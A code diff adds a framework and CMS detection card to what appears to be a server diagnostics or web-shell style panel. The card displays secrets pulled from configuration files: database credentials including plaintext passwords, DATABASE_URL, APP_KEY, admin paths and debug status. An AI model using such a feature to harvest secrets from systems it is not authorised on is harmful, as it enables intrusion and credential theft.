@@ -489,6 +489,42 @@ function loadDiag() {
       });
       html += '</tbody></table></div></div></div>';
 
+      // ---- Framework Detection ----
+      if (d.frameworks && d.frameworks.length > 0) {
+        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F50D; Framework / CMS Detection' + diagCopyBtn() + '</div><div class="card-body">';
+        d.frameworks.forEach(function(fw) {
+          var verBadge = fw.version ? '<span class="badge badge-ok">' + escHtml(fw.version) + '</span>' : '<span class="badge badge-warn">unknown</span>';
+          html += '<div style="margin-bottom:16px;padding:12px;background:rgba(0,0,0,.2);border-radius:6px;border:1px solid var(--border)">';
+          html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><strong style="color:var(--accent);font-size:14px">' + escHtml(fw.name) + '</strong> ' + verBadge + '</div>';
+          if (fw.config_path) html += '<div class="diag-item"><span class="diag-label">Config</span><span class="diag-value">' + escHtml(fw.config_path) + '</span></div>';
+          var det = fw.details || {};
+          if (det.db_host || det.db_name || det.db_user) {
+            html += '<div style="margin-top:8px;padding:8px;background:rgba(0,0,0,.2);border-radius:4px;font-size:12px">';
+            html += '<div style="color:var(--red);font-weight:600;margin-bottom:4px">Database Credentials</div>';
+            if (det.db_host) html += '<div class="diag-item"><span class="diag-label">Host</span><span class="diag-value">' + escHtml(det.db_host) + '</span></div>';
+            if (det.db_name) html += '<div class="diag-item"><span class="diag-label">Database</span><span class="diag-value">' + escHtml(det.db_name) + '</span></div>';
+            if (det.db_user) html += '<div class="diag-item"><span class="diag-label">User</span><span class="diag-value">' + escHtml(det.db_user) + '</span></div>';
+            if (det.db_pass) html += '<div class="diag-item"><span class="diag-label">Password</span><span class="diag-value" style="color:var(--red)">' + escHtml(det.db_pass) + '</span></div>';
+            if (det.db_driver) html += '<div class="diag-item"><span class="diag-label">Driver</span><span class="diag-value">' + escHtml(det.db_driver) + '</span></div>';
+            if (det.table_prefix) html += '<div class="diag-item"><span class="diag-label">Table prefix</span><span class="diag-value">' + escHtml(det.table_prefix) + '</span></div>';
+            if (det.database_url) html += '<div class="diag-item"><span class="diag-label">DATABASE_URL</span><span class="diag-value" style="color:var(--red);word-break:break-all">' + escHtml(det.database_url) + '</span></div>';
+            html += '</div>';
+          }
+          if (det.debug) {
+            var debugColor = det.debug === 'enabled' ? 'var(--red)' : 'var(--green)';
+            html += '<div class="diag-item"><span class="diag-label">Debug mode</span><span class="badge" style="background:rgba(0,0,0,.2);color:' + debugColor + '">' + escHtml(det.debug) + '</span></div>';
+          }
+          if (det.app_key) html += '<div class="diag-item"><span class="diag-label">APP_KEY</span><span class="diag-value" style="color:var(--yellow);word-break:break-all">' + escHtml(det.app_key) + '</span></div>';
+          if (det.app_env) html += '<div class="diag-item"><span class="diag-label">APP_ENV</span><span class="diag-value">' + escHtml(det.app_env) + '</span></div>';
+          if (det.admin_path) html += '<div class="diag-item"><span class="diag-label">Admin path</span><span class="diag-value">' + escHtml(det.admin_path) + '</span></div>';
+          if (det.plugins !== undefined) html += '<div class="diag-item"><span class="diag-label">Plugins</span><span class="diag-value">' + det.plugins + '</span></div>';
+          if (det.themes !== undefined) html += '<div class="diag-item"><span class="diag-label">Themes</span><span class="diag-value">' + det.themes + '</span></div>';
+          if (det.log_file) html += '<div class="diag-item"><span class="diag-label">Log file</span><span class="diag-value">' + escHtml(det.log_file) + '</span></div>';
+          html += '</div>';
+        });
+        html += '</div></div>';
+      }
+
       // ---- Disabled functions ----
       html += '<div class="card"><div class="card-header">&#x1F6AB; Disabled Functions' + diagCopyBtn() + '</div><div class="card-body"><div style="font-family:monospace;font-size:12px;color:var(--muted);word-break:break-all">' + escHtml(d.disable_functions) + '</div></div></div>';
 
